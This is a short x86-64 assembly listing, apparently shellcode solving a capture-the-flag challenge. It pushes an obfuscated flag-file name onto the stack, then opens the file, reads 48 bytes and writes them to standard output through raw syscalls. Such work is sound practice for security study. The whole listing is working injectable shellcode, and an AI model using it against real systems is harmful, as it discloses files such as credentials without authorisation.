
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x676e6f306f306f
    xor [rsp], rax
    mov rax, 0x306f306f306f306f
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x303030306f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f3030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x303030306f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6c5f797265765f73
    push rax
    mov rax, 0x695f656d616e5f65
    push rax
    mov rax, 0x6c69665f6568745f
    push rax
    mov rax, 0x7972726f732e656c
    push rax
    mov rax, 0x69665f736968745f
    push rax
    mov rax, 0x646165725f657361
    push rax
    mov rax, 0x656c705f656c6966
    push rax
    mov rax, 0x5f67616c665f726b
    push rax
    mov rax, 0x2e656c62616e7770
    push rax
    mov rax, 0x5f73695f73696874
    push rax
    mov     rax, 2
    mov     rdi, rsp
    mov     rsi, 0
    mov     rdx, 0
    syscall
    mov rdi, rax

    xor eax, eax
    push 48
    pop rdx
    mov rsi, rsp
    syscall

    push 1
    pop rax
    push 1
    pop rdi
    push 48
    pop rdx
    mov rsi, rsp
    syscall
    


